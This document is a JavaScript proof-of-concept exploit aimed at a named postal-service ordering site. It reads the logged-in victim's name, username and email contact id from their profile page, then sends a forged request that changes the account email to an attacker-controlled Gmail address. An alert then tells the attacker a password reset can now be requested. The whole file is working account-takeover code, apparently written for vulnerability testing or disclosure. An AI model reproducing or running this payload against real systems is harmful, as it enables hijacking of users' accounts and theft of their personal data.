const xhr = new XMLHttpRequest();

xhr.open(
    'GET',
    'https://eordre.posten.no/OA_HTML/xxcu_ibeCAcdPersonalInfo_NBFV.jsp',
    true
);

xhr.withCredentials = true;

xhr.onreadystatechange = function () {

    if (xhr.readyState === 4) {

        if (xhr.status === 200) {

            const parser = new DOMParser();
            const doc = parser.parseFromString(xhr.responseText, 'text/html');

            const emailContactPointId = doc.querySelector('input[name="email_contact_point_id"]')?.value || null;
            const emailAddress = doc.querySelector('input[name="o_email_address"]')?.value || null;
            const o_first_name =  doc.querySelector('input[name="o_first_name"]')?.value || null;  
            const o_middle_name =  doc.querySelector('input[name="o_middle_name"]')?.value || null;  
            const o_last_name =  doc.querySelector('input[name="o_last_name"]')?.value || null;  
            const username =  doc.querySelector('input[id="username"]')?.value || null;
            const newemail = "attacker.email123@gmail.com";// Enter new email
            const img = new Image();

function finish() {
    alert(
        "Email has changed from"+emailAddress+"to"+newemail+"for username:"+username+", Now you can request forget password."
    );
}

img.onload = function () {
    document.body.appendChild(img);
    finish();
};

img.onerror = function () {
    console.error("Image failed to load.");
    finish();
};

img.src = `https://eordre.posten.no/OA_HTML/xxcu_ibeCAcdPersonalInfo_NBFV.jsp?submit.x=&ibempf=0:0:0&first_name=${o_first_name}&o_first_name=${o_first_name}&middle_name=${o_middle_name}&o_middle_name=${o_middle_name}&last_name=${o_last_name}&o_last_name=${o_last_name}&object_version_number=14&email_address=${newemail}&o_email_address=${emailAddress}&email_contact_point_id=${emailContactPointId}&email_object_vers44444ion_number=&password=&vpassword=`;
        } else {

            console.error(
                'Request failed:',
                xhr.status,
                xhr.statusText
            );

        }

    }

};

xhr.onerror = function () {
    console.error('Network Error');
};

xhr.send();
